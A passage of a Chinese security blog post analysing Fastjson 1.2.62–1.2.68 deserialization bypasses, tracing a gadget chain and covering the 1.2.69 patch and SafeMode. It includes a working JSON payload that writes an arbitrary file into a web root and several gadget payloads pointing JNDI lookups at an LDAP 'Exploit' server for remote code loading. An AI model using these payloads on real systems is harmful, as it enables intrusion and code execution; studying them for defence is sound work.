+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/** Sets a new OutputStream. The position and total are reset, discarding any buffered bytes.</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> outputStream May be null. */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setOutputStream</span> <span class="hljs-params">(OutputStream outputStream)</span> &#123;<br>    <span class="hljs-built_in">this</span>.outputStream = outputStream;<br>    position = <span class="hljs-number">0</span>;<br>    total = <span class="hljs-number">0</span>;<br>&#125;<br> <br>...<br> <br><span class="hljs-comment">/** Sets the buffer that will be written to. &#123;<span class="hljs-doctag">@link</span> #setBuffer(byte[], int)&#125; is called with the specified buffer&#x27;s length as the</span><br><span class="hljs-comment"> * maxBufferSize. */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBuffer</span> <span class="hljs-params">(<span class="hljs-type">byte</span>[] buffer)</span> &#123;<br>    setBuffer(buffer, buffer.length);<br>&#125;<br> <br>...<br> <br><span class="hljs-comment">/** Writes the buffered bytes to the underlying OutputStream, if any. */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">flush</span> <span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> KryoException &#123;<br>    <span class="hljs-keyword">if</span> (outputStream == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        outputStream.write(buffer, <span class="hljs-number">0</span>, position);<br>        outputStream.flush();<br>    &#125; <span class="hljs-keyword">catch</span> (IOException ex) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">KryoException</span>(ex);<br>    &#125;<br>    total += position;<br>    position = <span class="hljs-number">0</span>;<br>&#125;<br> <br>...<br></code></pre></td></tr></table></figure>
+
+<p>如果可以写入文件的话，我们这里可以写入一些恶意文件。</p>
+<p>接着，就是要看怎么触发Output类<code>flush()</code>函数了，<code>flush()</code>函数只有在<code>close()</code>和<code>require()</code>函数被调用时才会触发，其中<code>require()</code>函数在调用write相关函数时会被触发。这也是链子的思维</p>
+<p>其中，找到JDK的ObjectOutputStream类，其内部类BlockDataOutputStream的构造函数中将OutputStream类型参数赋值给out成员变量，而其<code>setBlockDataMode()</code>函数中调用了<code>drain()</code>函数、<code>drain()</code>函数中又调用了<code>out.write()</code>函数，满足前面的需求：</p>
+<p>还是直接看代码会更直观一点</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**  </span><br><span class="hljs-comment"> * Creates new BlockDataOutputStream on top of given underlying stream.  </span><br><span class="hljs-comment"> * Block data mode is turned off by default.  </span><br><span class="hljs-comment"> */</span>  <br> BlockDataOutputStream(OutputStream out) &#123;  <br> <span class="hljs-built_in">this</span>.out = out;  <br> dout = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataOutputStream</span>(<span class="hljs-built_in">this</span>);  <br> &#125;  <br>  <br> <span class="hljs-comment">/**  </span><br><span class="hljs-comment"> * Sets block data mode to the given mode (true == on, false == off)  </span><br><span class="hljs-comment"> * and returns the previous mode value.  If the new mode is the same as  </span><br><span class="hljs-comment"> * the old mode, no action is taken.  If the new mode differs from the  </span><br><span class="hljs-comment"> * old mode, any buffered data is flushed before switching to the new  </span><br><span class="hljs-comment"> * mode.  </span><br><span class="hljs-comment"> */</span>  <br> <span class="hljs-type">boolean</span> <span class="hljs-title function_">setBlockDataMode</span><span class="hljs-params">(<span class="hljs-type">boolean</span> mode)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br> <span class="hljs-keyword">if</span> (blkmode == mode) &#123;  <br> <span class="hljs-keyword">return</span> blkmode;  <br> &#125;  <br> drain();  <br> blkmode = mode;  <br> <span class="hljs-keyword">return</span> !blkmode;  <br> &#125;  <br>  <br>...  <br>  <br> <span class="hljs-comment">/**  </span><br><span class="hljs-comment"> * Writes all buffered data from this stream to the underlying stream,  </span><br><span class="hljs-comment"> * but does not flush underlying stream.  </span><br><span class="hljs-comment"> */</span>  <br> <span class="hljs-keyword">void</span> <span class="hljs-title function_">drain</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br> <span class="hljs-keyword">if</span> (pos == <span class="hljs-number">0</span>) &#123;  <br> <span class="hljs-keyword">return</span>;  <br> &#125;  <br> <span class="hljs-keyword">if</span> (blkmode) &#123;  <br> writeBlockHeader(pos);  <br> &#125;  <br> out.write(buf, <span class="hljs-number">0</span>, pos);  <br> pos = <span class="hljs-number">0</span>;  <br> &#125;<br></code></pre></td></tr></table></figure>
+
+<p>到drain()函数里触发了write方法-&gt;require()-&gt;flash()</p>
+<p>对于setBlockDataMode()函数的调用，在ObjectOutputStream类的有参构造函数中就存在：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ObjectOutputStream</span><span class="hljs-params">(OutputStream out)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>     verifySubclass();  <br>     bout = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BlockDataOutputStream</span>(out);  <br>     handles = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HandleTable</span>(<span class="hljs-number">10</span>, (<span class="hljs-type">float</span>) <span class="hljs-number">3.00</span>);  <br>     subs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReplaceTable</span>(<span class="hljs-number">10</span>, (<span class="hljs-type">float</span>) <span class="hljs-number">3.00</span>);  <br>     enableOverride = <span class="hljs-literal">false</span>;  <br>     writeStreamHeader();  <br>     bout.setBlockDataMode(<span class="hljs-literal">true</span>);  <br>     <span class="hljs-keyword">if</span> (extendedDebugInfo) &#123;  <br>         debugInfoStack = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DebugTraceInfoStack</span>();  <br>&#125; <span class="hljs-keyword">else</span> &#123;  <br>     debugInfoStack = <span class="hljs-literal">null</span>;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>但是Fastjson优先获取ObjectOutputStream类的无参构造方法，只能找它的继承类来触发了</p>
+<p>我们找到一个只有有参构造方法的类：<code>com.sleepycat.bind.serial.SerialOutput</code></p>
+<p>依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.sleepycat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>je<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.0.73<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>看到SerialOutput类的构造函数中是调用了父类ObjectOutputStream的有参构造函数，这就满足了前面的条件</p>
+<p><img src="/img/fastjson/f67.png" srcset="/img/loading.gif" lazyload></p>
+<p>小结一下</p>
+<p>这条链子还是有点复杂的，如果从正向看的话</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">SerialOutput.SerialOutput(OutputStream out, ClassCatalog classCatalog)-&gt;<br>ObjectOutputStream.ObjectOutputStream(OutputStream out)-&gt;<br>BlockDataOutputStreamBlockDataOutputStream(out)-&gt;<br>BlockDataOutputStream.setBlockDataMode(boolean mode)-&gt;<br>BlockDataOutputStream. drain()-&gt;<br>xxxxx.write()-&gt;xxxxx.require()-&gt;<br>Output.flush()<br></code></pre></td></tr></table></figure>
+
+<p>POC如下，用到了Fastjson循环引用的技巧来调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;stream&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span>,<br>        <span class="hljs-string">&quot;targetPath&quot;</span>: <span class="hljs-string">&quot;D:/wamp64/www/hacked.txt&quot;</span>,<br>        <span class="hljs-string">&quot;tempPath&quot;</span>: <span class="hljs-string">&quot;D:/wamp64/www/test.txt&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;writer&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.esotericsoftware.kryo.io.Output&quot;</span>,<br>        <span class="hljs-string">&quot;buffer&quot;</span>: <span class="hljs-string">&quot;cHduZWQ=&quot;</span>,<br>        <span class="hljs-string">&quot;outputStream&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;$ref&quot;</span>: <span class="hljs-string">&quot;$.stream&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;position&quot;</span>: <span class="hljs-number">5</span><br>    &#125;,<br>    <span class="hljs-string">&quot;close&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sleepycat.bind.serial.SerialOutput&quot;</span>,<br>        <span class="hljs-string">&quot;out&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;$ref&quot;</span>: <span class="hljs-string">&quot;$.writer&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>看GitHub官方的diff，主要在ParserConfig.java中：<a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/compare/1.2.68%E2%80%A61.2.69#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4">https://github.com/alibaba/fastjson/compare/1.2.68%E2%80%A61.2.69#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4</a></p>
+<p>对比看到expectClass的判断逻辑中，对类名进行了Hash处理再比较哈希黑名单，并且添加了三个类：</p>
+<p><img src="https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1268PackFix.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>网上已经有了利用彩虹表碰撞的方式得到的新添加的三个类分别为：</p>
+<table>
+<thead>
+<tr>
+<th>版本</th>
+<th>十进制Hash值</th>
+<th>十六进制Hash值</th>
+<th>类名</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1.2.69</td>
+<td>5183404141909004468L</td>
+<td>0x47ef269aadc650b4L</td>
+<td>java.lang.Runnable</td>
+</tr>
+<tr>
+<td>1.2.69</td>
+<td>2980334044947851925L</td>
+<td>0x295c4605fd1eaa95L</td>
+<td>java.lang.Readable</td>
+</tr>
+<tr>
+<td>1.2.69</td>
+<td>-1368967840069965882L</td>
+<td>0xed007300a7b227c6L</td>
+<td>java.lang.AutoCloseable</td>
+</tr>
+</tbody></table>
+<p>这就简单粗暴地防住了这几个类导致的绕过问题了</p>
+<h3 id="SafeMode"><a href="#SafeMode" class="headerlink" title="SafeMode"></a>SafeMode</h3><p>官方参考：<a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/wiki/fastjson_safemode">https://github.com/alibaba/fastjson/wiki/fastjson_safemode</a></p>
+<p>在1.2.68之后的版本，在1.2.68版本中，fastjson增加了safeMode的支持。safeMode打开后，完全禁用autoType。所有的安全修复版本sec10也支持SafeMode配置。</p>
+<p>代码中设置开启SafeMode如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setSafeMode(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure>
+
+<p>开启之后，就完全禁用AutoType即<code>@type</code>了，这样就能防御住Fastjson反序列化漏洞了。</p>
+<p>具体的处理逻辑，是放在<code>checkAutoType()</code>函数中的前面，获取是否设置了SafeMode，如果是则直接抛出异常终止运行：</p>
+<p><img src="https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/safeModeDefense.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h1 id="其他一些绕过黑名单的Gadget"><a href="#其他一些绕过黑名单的Gadget" class="headerlink" title="其他一些绕过黑名单的Gadget"></a>其他一些绕过黑名单的Gadget</h1><p>注意，均需要开启AutoType，且会被JNDI注入利用所受的JDK版本限制。</p>
+<h2 id="1-2-59"><a href="#1-2-59" class="headerlink" title="1.2.59"></a>1.2.59</h2><p>com.zaxxer.hikari.HikariConfig类PoC：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;metricRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">&#125;</span>或<span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;healthCheckRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="1-2-61"><a href="#1-2-61" class="headerlink" title="1.2.61"></a>1.2.61</h2><p>org.apache.commons.proxy.provider.remoting.SessionBeanProvider类PoC：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;jndiName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;Object&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="1-2-62"><a href="#1-2-62" class="headerlink" title="1.2.62"></a>1.2.62</h2><p>org.apache.cocoon.components.slide.impl.JMSContentInterceptor类PoC：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;parameters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.util.Hashtable&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;java.naming.factory.initial&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;topic-factory&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;namespace&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="1-2-68"><a href="#1-2-68" class="headerlink" title="1.2.68"></a>1.2.68</h2><p>org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig类PoC：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;metricRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">&#125;</span>或<span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;healthCheckRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>com.caucho.config.types.ResourceRef类PoC：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.caucho.config.types.ResourceRef&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;lookupName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.value&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="未知版本"><a href="#未知版本" class="headerlink" title="未知版本"></a>未知版本</h2><p>org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory类PoC：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;tmJndiName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;tmFromJndi&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;transactionManager&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.transactionManager&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory类PoC：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;tmJndiName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;tmFromJndi&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;transactionManager&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.transactionManager&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://johnfrod.top/%E5%AE%89%E5%85%A8/704/">Fastjson反序列化漏洞(4)—1.2.68版本 – JohnFrod’s Blog</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Java%E5%AE%89%E5%85%A8/" class="category-chain-item">Java安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java%E5%AE%89%E5%85%A8/" class="print-no-link">#Java安全</a>
+      
+        <a href="/tags/Fastjson/" class="print-no-link">#Fastjson</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Java安全-Fastjson1.2.62-1.2.68版本反序列化漏洞</div>
+      <div>http://huang-d1.github.io/2025/10/10/Java安全-Fastjson1.2.62-1.2.68版本反序列化漏洞/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>huangdi</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年10月10日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/10/04/Java%E5%AE%89%E5%85%A8-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/" title="Java安全-Fastjson各版本绕过分析">
+                        <span class="hidden-mobile">Java安全-Fastjson各版本绕过分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://Hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://huang-d1.github.io" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
